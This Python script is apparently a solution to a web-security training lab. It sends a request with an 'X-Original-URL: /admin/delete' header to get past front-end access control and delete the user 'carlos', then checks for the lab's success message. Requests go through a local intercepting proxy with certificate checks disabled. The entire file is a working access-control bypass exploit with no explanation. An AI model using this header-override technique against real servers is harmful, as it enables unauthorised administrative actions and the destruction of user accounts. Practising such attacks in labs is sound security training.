import requests
import sys
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}

def delete_user(s, url):

    delete_carlos_user_url = url + "/?username=carlos"
    headers = {"X-Original-URL": "/admin/delete"}
    r = s.get(delete_carlos_user_url, headers=headers, verify=False, proxies=proxies)

    # Verify if the user was deleted
    r = s.get(url, verify=False, proxies=proxies)
    res = r.text
    if "Congratulations, you solved the lab!" in res:
        print("(+) Successfully deleted Carlos user.")
    else:
        print("(-) Could not delete Carlos user.")
        
def main():
    if len(sys.argv) != 2:
        print("(+) Usage: %s <url>" % sys.argv[0])
        print("(+) Example: %s www.example.com" % sys.argv[0])
        sys.exit(-1)

    s = requests.Session()
    url = sys.argv[1]
    delete_user(s, url)

if __name__ == "__main__":
    main()